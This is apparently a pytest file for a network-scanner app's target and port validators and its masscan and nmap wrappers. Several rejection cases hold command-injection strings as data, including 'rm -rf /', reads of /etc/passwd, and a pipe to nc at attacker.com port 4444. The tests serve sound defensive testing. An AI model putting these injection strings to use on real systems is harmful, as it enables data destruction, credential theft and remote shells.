from types import ModuleType, SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from app.scanner.masscan_wrapper import run_masscan
from app.scanner.nmap_wrapper import run_nmap
from app.scanner.validator import validate_target


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("192.168.1.1", "192.168.1.1"),
        ("192.168.1.0/24", "192.168.1.0/24"),
        ("10.0.0.0/8", "10.0.0.0/8"),
        ("192.168.1.1, 10.0.0.0/8", "192.168.1.1,10.0.0.0/8"),
        ("2001:db8::1", "2001:db8::1"),
    ],
)
def test_validate_target_accepts_ip_cidr_and_lists(target: str, expected: str) -> None:
    assert validate_target(target) == expected


@pytest.mark.parametrize(
    "target",
    [
        "",
        "   ",
        "not-an-ip",
        "999.999.999.999",
        "abc.def.ghi.jkl",
        "192.168.1.0/33",
        # Shell metacharacters must never reach a scanner command.
        "192.168.1.1; rm -rf /",
        # Command chaining must be rejected as data, not interpreted.
        "192.168.1.1 && cat /etc/passwd",
        # A pipe plus a network utility is also an injection attempt.
        "127.0.0.1 | nc attacker.com 4444",
        "10.0.0.1,,10.0.0.2",
    ],
)
def test_validate_target_rejects_invalid_values(target: str) -> None:
    with pytest.raises(ValueError):
        validate_target(target)


def test_validate_target_rejects_oversized_cidr() -> None:
    with pytest.raises(ValueError, match="invalid target"):
        validate_target("192.168.1.0/999")


def test_validate_target_rejects_very_long_input() -> None:
    # Limiting input length prevents expensive parsing of attacker-controlled data.
    with pytest.raises(ValueError, match="too long"):
        validate_target("1" * 4097)


@pytest.mark.parametrize("ports", ["80", "1-1024", "22,80,443"])
def test_validate_ports_accepts_numeric_specs(ports: str) -> None:
    from app.scanner.validator import validate_ports

    assert validate_ports(ports) == ports


@pytest.mark.parametrize("ports", ["", "0", "65536", "80-", "80; cat /etc/passwd"])
def test_validate_ports_rejects_unsafe_specs(ports: str) -> None:
    from app.scanner.validator import validate_ports

    with pytest.raises(ValueError):
        validate_ports(ports)


def test_masscan_wrapper_uses_validated_arguments() -> None:
    scanner = SimpleNamespace(
        scan=lambda *args, **kwargs: None,
        scan_result={
            "scan": {"192.168.1.1": {"tcp": {"80": {"state": "open", "name": "http"}}}}
        },
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with (
        patch(
            "app.scanner.masscan_wrapper.importlib.import_module",
            return_value=masscan_module,
        ),
        patch.object(scanner, "scan") as scan,
    ):
        result = run_masscan("192.168.1.1", ports="80")

    scan.assert_called_once_with("192.168.1.1", ports="80")
    assert result.scanned_ports[0].port == 80
    assert result.scanned_ports[0].service == "http"


def test_masscan_wrapper_parses_standard_json_response() -> None:
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result={
            "scan": {
                "192.168.1.1": [
                    {"status": "open", "port": 22, "proto": "tcp"},
                    {"status": "closed", "port": 23, "proto": "tcp"},
                ]
            }
        },
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("192.168.1.1", ports="22-23")

    assert [(port.port, port.protocol) for port in result.scanned_ports] == [
        (22, "tcp")
    ]


def test_masscan_wrapper_parses_python_masscan_nested_ports() -> None:
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result={
            "scan": {
                "92.53.106.219": [
                    {
                        "ip": "92.53.106.219",
                        "ports": [
                            {"port": 80, "proto": "tcp", "status": "open"},
                            {"port": 21, "proto": "tcp", "status": "open"},
                            {"port": 23, "proto": "tcp", "status": "closed"},
                        ],
                    }
                ]
            }
        },
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("92.53.106.219", ports="1-1000")

    assert [port.port for port in result.scanned_ports] == [80, 21]


def test_masscan_wrapper_parses_json_string_output() -> None:
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result='{"scan":{"92.53.106.219":[{"port":80,"proto":"tcp","status":"open"}]}}',
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("92.53.106.219", ports="80")

    assert [(port.port, port.protocol) for port in result.scanned_ports] == [
        (80, "tcp")
    ]


def test_masscan_wrapper_parses_empty_response() -> None:
    scanner = SimpleNamespace(scan=MagicMock(), scan_result={"scan": {}})
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("192.168.1.1")

    assert result.scanned_ports == []


def test_masscan_wrapper_rejects_broken_json_shape() -> None:
    # Missing the required port field models truncated or malformed scanner JSON.
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result={"scan": {"192.168.1.1": [{"status": "open"}]}},
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with (
        patch(
            "app.scanner.masscan_wrapper.importlib.import_module",
            return_value=masscan_module,
        ),
        pytest.raises(RuntimeError, match="Masscan scan failed"),
    ):
        run_masscan("192.168.1.1")


def test_masscan_wrapper_reports_missing_dependency() -> None:
    with (
        patch(
            "app.scanner.masscan_wrapper.importlib.import_module",
            side_effect=ModuleNotFoundError("masscan"),
        ),
        pytest.raises(RuntimeError, match="python-masscan"),
    ):
        run_masscan("127.0.0.1")


def test_nmap_wrapper_uses_library_api() -> None:
    process = SimpleNamespace(stdout="nmap output", run=lambda: None)
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    service = SimpleNamespace(
        port=22,
        protocol="tcp",
        service="ssh",
        service_product="OpenSSH",
        service_version="9.0",
    )
    host = SimpleNamespace(
        services=[service],
        os=SimpleNamespace(osmatches=[SimpleNamespace(name="Linux")]),
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with (
        patch(
            "app.scanner.nmap_wrapper.importlib.import_module",
            side_effect=[nmap_process_module, nmap_parser_module],
        ),
        patch.object(process, "run") as run,
    ):
        result = run_nmap("10.0.0.0/24", ports="22,80")

    run.assert_called_once_with()
    assert result.target == "10.0.0.0/24"
    assert result.services[0].version == "OpenSSH 9.0"
    assert result.os_detection == "Linux"


def test_nmap_wrapper_reads_service_dict_name() -> None:
    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    service = SimpleNamespace(
        port=443,
        protocol="tcp",
        service="",
        service_dict={"name": "https"},
        service_product="",
        service_version="",
    )
    host = SimpleNamespace(services=[service], os=SimpleNamespace(osmatches=[]))
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("8.8.8.8", ports="443")

    assert result.services[0].service == "https"


def test_nmap_wrapper_parses_empty_report() -> None:
    process = SimpleNamespace(stdout="<nmaprun />", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("192.168.1.1")

    assert result.services == []
    assert result.os_detection == ""


def test_nmap_wrapper_rejects_broken_xml_response() -> None:
    process = SimpleNamespace(stdout="<nmaprun", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    parser = MagicMock()
    parser.parse.side_effect = ValueError("incomplete XML")
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = parser  # type: ignore[attr-defined]

    with (
        patch(
            "app.scanner.nmap_wrapper.importlib.import_module",
            side_effect=[nmap_process_module, nmap_parser_module],
        ),
        pytest.raises(RuntimeError, match="Nmap scan failed"),
    ):
        run_nmap("192.168.1.1")


def test_nmap_wrapper_rejects_unsafe_ports_before_import() -> None:
    with pytest.raises(ValueError):
        run_nmap("127.0.0.1", ports="80; --script evil")
